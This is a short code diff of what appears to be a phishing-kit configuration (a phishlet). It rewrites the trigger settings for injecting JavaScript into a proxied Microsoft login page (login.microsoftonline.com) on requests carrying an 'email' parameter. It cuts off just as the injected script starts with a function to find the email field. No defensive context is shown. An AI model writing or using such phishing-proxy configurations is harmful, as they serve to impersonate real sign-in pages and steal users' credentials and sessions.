@@ -101,10 +101,9 @@ login:
   path: '/'
 
 js_inject:
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    path: '/'
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/']
+    trigger_params: ['email']
     script: |
       (function() {
         function findEmailField() {
